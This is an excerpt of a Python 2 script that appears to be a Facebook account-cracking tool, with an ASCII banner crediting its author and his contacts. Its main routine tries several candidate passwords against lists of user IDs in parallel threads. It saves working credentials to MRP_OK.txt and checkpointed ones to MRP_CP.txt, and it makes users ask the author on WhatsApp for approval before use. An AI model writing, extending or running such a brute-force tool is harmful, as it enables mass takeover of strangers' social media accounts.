...
\033[1;96m ╚═╝░░░░░╚═╝╚═╝░░╚═╝     ╚═╝░░╚═╝╚═════╝░╚═╝
\033[1;97m *******************************************
\033[1;93m      AUTHER    :     Mr ADii
\033[1;96m      GITHUB    :     /mrpardesi007
\033[1;95m      WP        :     +994402852581
\033[1;94m      FB        :     /Mrpardesi1
\033[1;97m *******************************************
"""
...
def reg():
    ...
    print logo
    print ''
    print '\033[1;31;1mTake The Approval 1st For Login'
    print ''
    time.sleep(1)
    ...
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+994402852581')
        reg()
...
def menu():
    ...
    print '\033[1;92m[2] Follow Mr ADii'
...
def menu_s():
    ms = raw_input('\033[1;97m╰─ADii➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('xdg-open https://facebook.com/Mrpardesi1/')
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;95m      ITz Mr ADii \033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[ADii-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;93m[ADii-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[ADii-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;93m[ADii-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('MRP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[ADii-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;93m[ADii-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('MRP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[ADii-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;93m[ADii-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('MRP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;96m________Process-Completed_________'
